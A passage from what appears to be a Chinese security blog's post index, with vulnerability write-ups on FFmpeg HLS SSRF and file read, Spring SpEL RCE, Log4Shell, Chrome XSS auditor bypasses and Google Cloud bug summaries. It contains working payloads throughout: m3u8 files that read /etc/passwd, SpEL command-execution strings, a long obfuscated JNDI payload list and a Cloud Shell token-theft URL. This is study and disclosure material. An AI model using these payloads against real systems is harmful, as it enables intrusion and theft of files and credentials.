Playlist）文件，里面包含了这次HLS会话的所有数据。\n\n如图所示，有一个主要的m3u8格式Playlist文件，里面可以包含下级的m3u8文件，客户端会再去索引下级的m3u8，继续解析下级的Playlist文件获取最终的TS流文件的http请求地址与时间段。\nhttp://pl.youku.com/playlist/m3u8?vid=340270152&amp;type=3gphd&amp;ts=1462714824&amp;keyframe=0&amp;ep=dSaSGE6MUssC5ybeiz8bYiXiIiZdXP0O9h2CgdNnAtQnS%2Bm2&amp;sid=746271452251312590fab&amp;token=3319&amp;ctype=12&amp;ev=1&amp;oip=3395898128\n这是youku一个视频的m3u8文件，内容如下：\n#EXTM3U#EXT-X-TARGETDURATION:6#EXT-X-VERSION:2#EXTINF:6,http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=0&amp;ts_end=5.9&amp;ts_seg_no=0&amp;ts_keyframe=1#EXTINF:0,http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=5.9&amp;ts_end=6.367&amp;ts_seg_no=1&amp;ts_keyframe=1#EXT-X-ENDLIST\n\n解析：\n#EXTM3U 标签是m3u8的文件头，开头必须要这一行#EXT-X-TARGETDURATION 表示整个媒体的长度 这里是6秒#EXT-X-VERSION:2 该标签可有可无#EXTINF:6, 表示该一段TS流文件的长度#EXT-X-ENDLIST 这个相当于文件结束符\n\n这些是m3u8的最基本的标签，而问题就出在FFMpeg去请求TS流文件的时，由于我们可以伪造一个m3u8文件，FFMpeg不会判断里面的流地址，直接请求。\n0x03 漏洞原理SSRF漏洞：\n直接用FFMpeg解析一个多媒体文件\n#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,http://192.168.123.100:8080/1.html#EXT-X-ENDLIST\n\n（#EXT-X-MEDIA-SEQUENCE或#EXT-X-TARGETDURATION必须存在任意一个，前者是定义ts流文件的序号。去掉会报错：无效文件）\n\nffmpeg -i test.m3u8 test.mp4（也可把m3u8格式改成其他后缀，ffmpeg会自动识别为HLS流文件）\n\n直接发起了http请求，这就造成一个SSRF。\n结合SSRF任意文件读取：\nFFMpeg支持很多扩展协议，其中的concat:协议可以合并多个流URL，官方称为Physical concatenation protocol\n这样可以合并多个URL concat:URL1|URL2|...|URLN\n新建一个主HLS文件h.m3u8在web服务器\n#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,concat:http://xxx/test.txt|http://xxx/test.txt （这两个txt都是m3u8,后缀可以随便改，ffmpeg会自动识别）#EXT-X-ENDLIST\n\n再创建一个下级的m3u8文件 test.txt，最终的请求会引到最下级的m3u8文件,也就是这个test.txt\n#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:,http://xxx.com/?\n\n再用ffmpeg处理test.m3u8\n#EXTM3U#EXT-X-TARGETDURATION:6#EXTINF:10.0,concat:http://xxx/h.m3u8#EXT-X-ENDLIST\n\n\n提示当读取第一段的时候出错，URL是http://xxx/?#EXTM3U，但我们建立的那个下级的m3u8文件 test.txt是http://xxx.com/?，多出来的“#EXTM3U，”这部分是用concat协议合并的那个txt，http://xxx/test.txt的第一行；而ffmpeg支持多种协议获取输入流，http、ftp、smb、file等，既然用concat协议可以读取文件的第一行，那把http换成file协议就可以读取本地文件了，漏洞就出在这里。\n主m3u8文件改成concat:http://xxx/test.txt|file:///etc/passwd，再请求就能读取到passwd文件的第一行，当然也可以读取内网网站的信息。\n\n但这样就只能读取一行，意义不大。但FFMpeg支持一个截取数据流片段的功能：subfile。用法：subfile,,start,153391104,end,268142592,,:/media/dvd/VIDEO_TS/VTS_08_1.VOB\nStart后是开始截取的偏移量，以字节为单位，end是结束的偏移量。\n既然可以截取数据流就可以利用subfile获取比较完整的文件了。测试时候一次最多只能截取32字节，所以要继续用concat合并多个数据流片段。\n#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,concat:http://198.56.193.29:8080/test.txt|subfile,,start,0,end,31,,:file:///etc/passwd|subfile,,start,32,end,63,,:file:///etc/passwd|subfile,,start,64,end,95,,:file:///etc/passwd|subfile,,start,96,end,127,,:file:///etc/passwd|subfile,,start,127,end,158,,:file:///etc/passwd#EXT-X-ENDLIST\n\n这样就可以读取任意文件的任意内容\n0x04 绕过大小检测之前的ImageMagick漏洞因为有些网站有文件大小检测而无法攻击，在这个漏洞中的测试我也发现一些网站有对上传视频文件的大小限制。这里有方法可以扩充文件大小。\n\n直接扩充#EXTINF，这个标签前面说过，是代表TS流文件的时间长度，可以无限扩充，直到符合大小为止，仍可正常解析。\n","categories":["漏洞分析"],"tags":["Web"]},{"title":"CVE-2018-1270 Remote Code Execution with spring-messaging","url":"/CVE-2018-1270%20Remote%20Code%20Execution%20with%20spring-messaging/","content":"\n\nCVE-2018-1270 \n\n\n\n\nSTOMP协议STOMP是一个简单的可互操作的协议, 被用于通过中间服务器在客户端之间进行异步消息传递。它定义了一种在客户端与服务端进行消息传递的文本格式.\nSTOMP协议与HTTP协议很相似，它基于TCP协议，使用了以下命令：\nCONNECTSENDSUBSCRIBEUNSUBSCRIBEBEGINCOMMITABORTACKNACKDISCONNECT\n\nSTOMP的客户端和服务器之间的通信是通过“帧”（Frame）实现的，每个帧由多“行”（Line）组成。\n第一行包含了命令，然后紧跟键值对形式的Header内容。\n第二行必须是空行。\n第三行开始就是Body内容，末尾都以空字符结尾。\n\nSTOMP的客户端和服务器之间的通信是通过MESSAGE帧、RECEIPT帧或ERROR帧实现的，它们的格式相似。\n客户端可以使用SEND命令来发送消息以及描述消息的内容，用SUBSCRIBE命令来订阅消息以及由谁来接收消息。这样就可以建立一个发布订阅系统，消息可以从客户端发送到服务器进行操作，服务器也可以推送消息到客户端。\nconnect接受一个可选的headers参数用来标识附加的头部，默认情况下，如果没有在headers额外添加，这个库会默认构建一个独一无二的ID。用户定义的headers通常用于允许使用者在进行订阅帧中的selector来过滤基于应用程序定义的headers消息。\n分析补丁https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a\n\n把StandardEvaluationContext换成了SimpleEvaluationContext\n\n使用了expression.getValue()猜测可能是SpEL表达式注入  \n删除了StandardEvaluationContext引用，采用了SimpleEvaluationContext,StandardEvaluationContext可以执行任意SpEL表达式，Spring官方在5.0.5之后换用SimpleEvaluationContext，用于实现简单的数据绑定，保持灵活性减少安全隐患\nhttps://github.com/spring-projects/spring-framework/blob/v5.0.5.RELEASE/spring-expression/src/main/java/org/springframework/expression/spel/support/StandardEvaluationContext.java\nhttps://github.com/spring-projects/spring-framework/blob/v5.0.5.RELEASE/spring-expression/src/main/java/org/springframework/expression/spel/support/SimpleEvaluationContext.java\n漏洞分析在expression.getValue()处设置断点\n\n跳入继续可以看到命令被表达式处理后执行\n\n然后再从expression.getValue()向上查看调用链\n&lt;—- filterSubscriptions(result, message) &lt;—-return findSubscriptionsInternal(destination, message);(findSubscriptions) &lt;—- this.subscriptionRegistry.findSubscriptions(message);(sendMessageToSubscribers)\n上游是sendMessageToSubscribers函数，send操作调用了getValue\n在this.subscriptionRegistry.findSubscriptions处设置断点，然后继续调试\n\n两层for循环把allMatches里的数据提取出来\n\n然后sub.getSelectorExpression取出Selector里的数据\n\n接着expression中的命令就被getValue触发执行了\n\n截止到这里，完成了从发送到执行的过程但是header是在connect阶段定义的\n先通过app.js添加header并构造执行语句\n\n在handleMessageInternal对消息进行处，跟踪header到了registerSubscription\n\naddSubscriptionInternal(sessionId, subscriptionId, destination, message);\n\n继续往下跟又回到了messaging/simp/broker/DefaultSubscriptionRegistry.java\n\n可以看到header中的数据已经被赋予给selector\n\n此时的sessionId和subsId如下图，到此connect过程就完成了，当send message的时候，就会根据sessionId和subsId来获取selector\n\n下图就是send message操作，sessionId和subsId与上图一致\n\n模块代码略读略http://www.cnblogs.com/davidwang456/p/4446796.html\n修复方案5.0.x users should upgrade to 5.0.54.3.x users should upgrade to 4.3.16Older versions should upgrade to a supported branch\n\n参考：https://pivotal.io/security/cve-2018-1270https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37ahttp://blog.nsfocus.net/spring-messaging-analysis/https://xz.aliyun.com/t/2252http://www.cnblogs.com/davidwang456/p/4446796.htmlhttps://segmentfault.com/a/1190000006617344https://cert.360.cn/warning/detail?id=3efa573a1116c8e6eed3b47f78723f12\n","categories":["JAVA安全"],"tags":["JAVA"]},{"title":"CVE-2018-1273 RCE with Spring Data Commons","url":"/CVE-2018-1273:%20RCE%20with%20Spring%20Data%20Commons/","content":"\n补丁分析https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653\n\n这里和CVE-2018-1270的修复方案类似，StandardEvaluationContext替换为SimpleEvaluationContext，又看到Expression expression = PARSER.parseExpression(propertyName);，基本可以确定是SpEL注入了\n代码分析（下游）从git上下载源码https://github.com/spring-projects/spring-data-examples\n根据patch的提示设置断点看一下数据流向\n\n传入的值是username\n\n看到setValue，确定是SpEL注入继续往下走，会发现username、password、repeatedPassword三个字段都会经过这几步\n\n既然这样，尝试修改字段名称来执行命令[T(java.lang.Runtime).getRuntime().exec(&#39;open -a calculator.app&#39;)，测试下，确实可以把完整的命令传进去\n[]是嵌套属性的写法，在[]中间可以写入表达式\n\n继续走到setValue处，expression存储的值就是传进来的完整的字段\n\n但是发现命令并没有执行，原因如下\n\nPOC利用水平太菜，参考了一下网上的payload，利用java的反射机制绕过\n[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;open -a calculator.app&quot;)]\n[#this.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&#39;open -a calculator.app&#39;)&quot;)]\n[(#root.getClass().forName(&quot;java.lang.ProcessBuilder&quot;).getConstructor(&#39;foo&#39;.split(&#39;&#39;).getClass()).newInstance(&#39;openxx-axxcalculator.app&#39;.split(&#39;xx&#39;))).start()]\n\n参考：http://blog.nsfocus.net/cve-2018-1273-analysis/https://pivotal.io/security/cve-2018-1273https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653https://xz.aliyun.com/t/2269\n","categories":["JAVA安全"],"tags":["JAVA"]},{"title":"CVE-2021-44228 Log4Shell","url":"/CVE-2021-44228%20Log4Shell/","content":"2021年12月9日晚上，Log4j2 JNDI注入漏洞详情被公开。漏洞发现过程：通过公开的CodeQL规则扫描出来的漏洞。漏洞编号：CVE-2021-44228。影响范围：Apache Log4j 2.x &lt;= 2.15.0-rc1。\nimport org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;public class log4j &#123;    private static final Logger logger = LogManager.getLogger(log4j.class);    public static void main(String[] args) &#123;        logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:1389/a&#125;&quot;);    &#125;&#125;\n\nLog4j2会解析${}，读取出其中的内容。判断其是否为Ldap实现的JNDI，于是调用Java底层的Lookup方法，尝试完成Ldap的Lookup操作。\nJNDIJNDI全称 Java Naming and Directory Interface。JNDI是Java平台的一个标准扩展，提供了一组接口、类和关于命名空间的概念。如同其它很多Java技术一样，JDNI是provider-based的技术，暴露了一个API和一个服务供应接口（SPI）。这意味着任何基于名字的技术都能通过JNDI而提供服务，只要JNDI支持这项技术。JNDI目前所支持的技术包括LDAP、CORBA Common Object Service（COS）名字服务、RMI、NDS、DNS、Windows注册表等等。很多J2EE技术，包括EJB都依靠JNDI来组织和定位实体。\nJDNI通过绑定的概念将对象和名称联系起来。在一个文件系统中，文件名被绑定给文件。在DNS中，一个IP地址绑定一个URL。在目录服务中，一个对象名被绑定给一个对象实体。\nJNDI中的一组绑定作为上下文来引用。每个上下文暴露的一组操作是一致的。例如，每个上下文提供了一个查找操作，返回指定名字的相应对象。每个上下文都提供了绑定和撤除绑定名字到某个对象的操作。JNDI使用通用的方式来暴露命名空间，即使用分层上下文以及使用相同命名语法的子上下文。（copy自网络）\nLDAPLDAP目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，支持过滤功能。\nLDAP（Light Directory Access Portocol），它是基于X.500标准的轻量级目录访问协议。\n目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。\n目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好象它的名字一样。\nLDAP目录服务是由目录数据库和一套访问协议组成的系统。（copy自网络）\nPayload$&#123;jndi:ldap://127.0.0.1/poc&#125;$&#123;jndi:rmi://127.0.0.1/poc&#125;$&#123;jndi:dns://127.0.0.1/poc&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://127.0.0.1/poc&#125;$&#123;$&#123;::-j&#125;ndi:rmi://127.0.0.1/poc&#125;$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://127.0.0.1/poc&#125;$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;$&#123;lower:a&#125;$&#123;lower:p&#125;&#125;://127.0.0.1/poc&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://127.0.0.1/poc&#125;$%7Bjndi:ldap://127.0.0.1/poc%7D$&#123;$&#123;env:ENV_NAME:-j&#125;ndi$&#123;env:ENV_NAME:-:&#125;$&#123;env:ENV_NAME:-l&#125;dap$&#123;env:ENV_NAME:-:&#125;127.0.0.1/poc&#125;$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;$&#123;lower:a&#125;$&#123;lower:p&#125;://127.0.0.1/poc&#125;$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;a$&#123;lower:p&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:j&#125;ndi:$&#123;lower:l&#125;$&#123;lower:d&#125;a$&#123;lower:p&#125;://127.0.0.1/poc&#125;$&#123;$&#123;env:TEST:-j&#125;ndi$&#123;env:TEST:-:&#125;$&#123;env:TEST:-l&#125;dap$&#123;env:TEST:-:&#125;127.0.0.1/poc&#125;$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;ap://127.0.0.1/poc&#125;$&#123;jndi:ldap://127.0.0.1#127.0.0.1/poc&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://k123.k123.k123/poc&#125;$&#123;$&#123;::-j&#125;ndi:rmi://k123.k123.k123/ass&#125;$&#123;jndi:rmi://k8.k123.k123&#125;$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://k8.k123.k123/poc&#125;$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://k8.k123.k123/poc&#125;$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://k8.k123.k123/poc&#125;j$&#123;loWer:Nd&#125;i$&#123;uPper::&#125;$&#123;jndi:ldaps://127.0.0.1/poc&#125;$&#123;jndi:iiop://127.0.0.1/poc&#125;$&#123;date:ldap://127.0.0.1/poc&#125;$&#123;java:ldap://127.0.0.1/poc&#125;$&#123;marker:ldap://127.0.0.1/poc&#125;$&#123;ctx:ldap://127.0.0.1/poc&#125;$&#123;lower:ldap://127.0.0.1/poc&#125;$&#123;upper:ldap://127.0.0.1/poc&#125;$&#123;main:ldap://127.0.0.1/poc&#125;$&#123;jvmrunargs:ldap://127.0.0.1/poc&#125;$&#123;sys:ldap://127.0.0.1/poc&#125;$&#123;env:ldap://127.0.0.1/poc&#125;$&#123;log4j:ldap://127.0.0.1/poc&#125;$&#123;j$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;$&#123;lower:l&#125;d$&#123;lower:a&#125;$&#123;lower:p&#125;://$&#123;hostName&#125;.&#123;&#123;interactsh-url&#125;&#125;&#125;$&#123;jndi:rmi://127.0.0.1&#125;/$&#123;jnd$&#123;123%25ff:-$&#123;123%25ff:-i:&#125;&#125;ldap://127.0.0.1/poc&#125;$&#123;jndi:dns://127.0.0.1&#125;$&#123;j$&#123;k8s:k5:-ND&#125;i:ldap://127.0.0.1/poc&#125;$&#123;j$&#123;k8s:k5:-ND&#125;i:ldap$&#123;sd:k5:-:&#125;//127.0.0.1/poc&#125;$&#123;j$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;ldap://127.0.0.1/poc&#125;$&#123;j$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;ldap$&#123;sd:k5:-:&#125;//127.0.0.1/poc&#125;$&#123;$&#123;k8s:k5:-J&#125;$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;ldap://127.0.0.1/poc&#125;$&#123;$&#123;k8s:k5:-J&#125;$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;ldap&#123;sd:k5:-:&#125;//127.0.0.1/poc&#125;$&#123;$&#123;k8s:k5:-J&#125;$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;l$&#123;lower:D&#125;ap$&#123;sd:k5:-:&#125;//127.0.0.1/poc&#125;$&#123;j$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;$&#123;lower:L&#125;dap$&#123;sd:k5:-:&#125;//127.0.0.1/poc$&#123;$&#123;k8s:k5:-J&#125;$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;l$&#123;lower:D&#125;a$&#123;::-p&#125;$&#123;sd:k5:-:&#125;//127.0.0.1/poc&#125;$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;a$&#123;lower:p&#125;://127.0.0.1&#125;$&#123;jnd$&#123;upper:i&#125;:ldap://127.0.0.1/poc&#125;$&#123;j$&#123;$&#123;:-l&#125;$&#123;:-o&#125;$&#123;:-w&#125;$&#123;:-e&#125;$&#123;:-r&#125;:n&#125;di:ldap://127.0.0.1/poc&#125;$&#123;jndi:ldap://127.0.0.1#127.0.0.1:1389/poc&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://127.0.0.1/poc&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:jndi&#125;:$&#123;lower:ldap&#125;://127.0.0.1/poc&#125;$&#123;$&#123;::-j&#125;ndi:rmi://127.0.0.1/poc&#125;$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:ldap&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:ldap&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:l&#125;d$&#123;lower:a&#125;p://127.0.0.1/poc&#125;$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;://127.0.0.1/poc&#125;$&#123;j$&#123;env:DOESNOTEXIST:-&#125;ndi:ldap://127.0.0.1/poc&#125;$&#123;j$&#123;env:DOESNOTEXIST:-&#125;ndi:rmi://127.0.0.1/poc&#125;$&#123;$&#123;: : : : ::: :: :: : :::-j&#125;ndi:ldap://127.0.0.1/poc&#125;$&#123;$&#123;: : : : ::: :: :: : :::-j&#125;ndi:rmi://127.0.0.1/poc&#125;$&#123;$&#123;::::::::::::::-j&#125;ndi:ldap://127.0.0.1/poc&#125;$&#123;$&#123;::::::::::::::-j&#125;ndi:rmi://127.0.0.1/poc&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://127.0.0.1/poc&#125;（copy自网络）\n\n漏洞复现创建LDAPRefServer\npoc：\npublic class Poc &#123;    public Poc() &#123;        try&#123;            String[] cmd = &#123;&quot;open&quot;, &quot;/System/Applications/Calculator.app&quot;&#125;;            Process process = Runtime.getRuntime().exec(cmd);            process.waitFor();        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public static void main(String[] args) &#123;        Poc poc = new Poc();    &#125;&#125;\n\n python3 -m http.server 8200\n\njava marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8200/#Poc&quot; \n\n执行\npackage net.uxss.log4j2;import org.apache.logging.log4j.*;public class Log4j2Test &#123;    private static final Logger logger = LogManager.getLogger(Log4j2Test.class);    public static void main(String[] args) &#123;        logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:1389/Poc&#125;&quot;);    &#125;&#125;\n\n\n","categories":["JAVA安全"],"tags":["JAVA"]},{"title":"Chrome XSS Auditor Bypass Payload","url":"/Chrome%20XSS%20Auditor%20Bypass%20Payload/","content":"测试版本：\n\n测试环境：\n\n===============================\n不需要交互http://115.159.0.191:8080/xss1.php?x=1%22%3E%3Cbr%3E%00%00%00%00%00%00%00%3Cscript%3Ealert%281%29%3C%2fscript%3E\nhttp://115.159.0.191:8080/xss1.php?x=1%22%3E%3Cmeta%20charset=ISO-2022-JP%3E%3Csvg%20onload%1B%28B=alert(1)%3E\nhttps://vulnerabledoma.in/char_test?body=%3Cobject%20allowscriptaccess=always%3E%20%3Cparam%20name=url%20value=https://l0.cm/xss.swf%3E\n\n\n\n\nCSP bypass via jQuery Gadget\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;script-src &#x27;nonce-random&#x27; &#x27;strict-dynamic&#x27;;&quot;&gt;&lt;script nonce=random src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.js&quot;&gt;&lt;/script&gt;&lt;script nonce=random&gt;$(document).ready(function()&#123;    // code taken from http://api.jquery.com/after/    $( &quot;.container&quot; ).after( $( &quot;.child&quot; ) );&#125;);&lt;/script&gt;&lt;/head&gt;&lt;body&gt;XSS XSS XSS&lt;form class=&quot;child&quot;&gt;&lt;input name=&quot;ownerDocument&quot;/&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;/form&gt;XSS XSS XSS&lt;p class=&quot;container&quot;&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n\n需要交互http://115.159.0.191:8080/xss1.php?x=1%22%3E%3Csvg%20width%3D10000px%20height%3D10000px%3E%3Ca%3E%3Crect%20width%3D10000px%20height%3D10000px%20z-index%3D9999999%20%2F%3E%3Canimate%20attributeName%3Dhref%20values%3Djavas%26%2399ript%3Aalert%281%29%3E\nhttps://vulnerabledoma.in/xss_auditortest?test=5&amp;q=%3Ca%20href=/**/alert%281%29%3ECLICK%3C/a%3E%3Cbase%20href=%22javascript:%5C\n","categories":["WEB安全"],"tags":["XSS"]},{"title":"Cloud I Hack into Google Cloud","url":"/Cloud%20I%20Hack%20into%20Google%20Cloud/","content":"在本月初，Google宣布了去年2021的Google Cloud Platform的六个VRP漏洞（ GCP VRP 奖旨在鼓励安全研究人员关注 GCP 的安全性，从而帮助我们为我们的用户、客户和整个互联网提高 GCP 的安全性），希望鼓励更多的安全研究者涉足云安全领域，这六个漏洞看完非常有趣，接下来我会用自己的理解分析下这几个漏洞。\n漏洞1: Bypassing Identity-Aware Proxy漏洞详情链接：https://www.seblu.de/2021/12/iap-bypass.html\nIAP(Identity-Aware Proxy)可以理解为是应用层零信任，在用户和应用之间增加了一层独立的身份认证。https://cloud.google.com/iap?hl=zh-cn\n\n根据作者的漏洞介绍，尝试着画了一下攻击路径(原文描述的有点凌乱，可能有不对的地方，见谅)，大概路径是通过这三个小漏洞，利用重定向，在受害者访问开启了IAP的APP之前先重定向到没有开IAP的APP上，然后捕获链接中的token，实现凭证窃取。\n\n就像作者说的，小的漏洞可以组合成大的漏洞，这或许也是Google为什么将其排在第一位的原因吧。\n漏洞2: 通过DHCP泛洪接管VM和获取ROOT访问权限漏洞详情链接：https://github.com/irsl/gcp-dhcp-takeover-code-exec\nISC 的 DHCP 客户端（Debian 风格的 isc-dhcp-client 包）的实现依赖于 random(3) 来生成伪随机数（非线性加性反馈随机数）。由当前unixtime、dhclient进程的pid和MAC最后四个字节。这三个值可以猜测出来，进而可以伪造DHCP包，在某些环境下，通过DHCP泛洪可以接管目标VM的网络配置。\n允许攻击者通过向虚拟机发送恶意 DHCP 数据包并冒充 GCE 元数据服务器来访问 Google Compute Engine 虚拟机。\nGoogle 严重依赖元数据服务器，包括 ssh 公钥的分发。 连接在网络/路由层是安全的，并且服务器没有经过身份验证（没有 TLS，仅清除 http）。 负责处理元数据服务器响应的google_guest_agent 进程通过虚拟主机名 metadata.google.internal 建立连接，该虚拟主机名是 /etc/hosts 文件中的别名。 该文件由 /etc/dhcp/dhclient-exit-hooks.d/google_set_hostname 作为 DHCP 响应处理的钩子部分管理，并且别名通常由该脚本在每个 DHCPACK 处添加。 通过完全控制 DHCP，可以模拟元数据服务器。\n\n\n漏洞4: 在 Cloud SQL 的中发现的多个漏洞漏洞详情链接：https://irsl.medium.com/the-speckle-umbrella-story-part-2-fcc0193614ea\n 作者研究Cloud SQL 攻击向量的过程中发现的多个漏洞\n3.1 Postgres 服务帐户可以访问其他 RDS（MySQL、SQL Server 等）的 Docker 映像\n3.2 MySQL LOAD DATA LOCAL 滥用\n3.3 终端转义序列注入 gcloud\n3.4 Postgres IAM 身份验证可能允许窃取其他用户的访问令牌\n3.5 Cloud SQL Auth Proxy 通过网络泄露访问令牌 — 中间人攻击\n3.6 Cloud SQL — SQL 代理信息泄露漏洞（项目和实例名称）\n这一系列漏洞对于研究其它云产品的安全性有着很大的借鉴意义。“在服务器端环顾四周是一次很棒的经历，我学到了很多关于 Google 内部的知识！”\n漏洞3: Google Cloud Dataflow 中的RCE漏洞详情链接：https://mbrancato.github.io/2021/12/28/rce-dataflow.html\nDataflow 节点暴露了未经身份验证的 Java JMX 端口，但是GCP默认的防火墙规则不会使其暴露在互联网。不过很多GCP用户会调整防火墙规则，导致5555端口暴露在互联网，从而可以被远程获取shell。\n这也是个蛮有趣的漏洞，用户的一些配置使安全变成了不安全，这在日常的工作中也经常遇到，任何一方做好都没有漏洞，挺好奇Google是如何修复的？\n漏洞5: Managed Anthos Service Mesh 控制面中的RCE漏洞详情链接：https://lf.lc/vrp/203177829/\n控制面（control plane）：用于帮助service mesh 来进行服务发现、流量治理等。\n\n这个漏洞在一般情况下需要在K8s集群中具有高访问权限，才能允许Istio控制面上执行远程命令。但是在某些特殊的场景下，就像Managed Anthos Service Mesh中，它在Google管理的项目中运行Istio控制面，当具备了高访问权限的时候，这个漏洞就变得严重了。（不知道这样理解对不对）\napiVersion: v1kind: Configcurrent-context: defaultclusters:- name: default  cluster:    server: https://127.0.0.1contexts:- name: default  context:    cluster: default    user: defaultusers:- name: default  user:    exec:      apiVersion: client.authentication.k8s.io/v1beta1      command: /bin/sh      args: [&#x27;-c&#x27;, &#x27;touch /tmp/flag&#x27;]\n\n漏洞6: Google Cloud Shell 中的命令注入漏洞详情链接：https://docs.google.com/document/d/1-TTCS6fS6kvFUkoJmX4Udr-czQ79lSUVXiWsiAED_bs/edit#\nCloud Shell 有个功能是可以通过类似下面的链接clone可信代码库的代码\nhttps://ssh.cloud.google.com/?git_repo=https://github.com/GoogleCloudPlatform/gsutilhttps://ssh.cloud.google.com/?go_get_repo=github.com/google/gops\n但是在配置文件中有个缺陷，git_repo和go_get_repo两个参数同时存在于链接中时，判断逻辑是or，所以只要git_repo和go_get_repo其中一个存在其中就可以，所以可以在go_get_repo参数上添加命令，同时在git_repo上加载可信代码库。\n\n最终构造的payload为：\nhttps://shell.cloud.google.com/?show=ide&amp;go_get_repo=%22;curl%200/service-accounts/default/token;%23&amp;git_repo=github.com/GoogleCloudPlatform/gsutil","categories":["云安全"],"tags":["Cloud"]},{"title":"Cloud Native 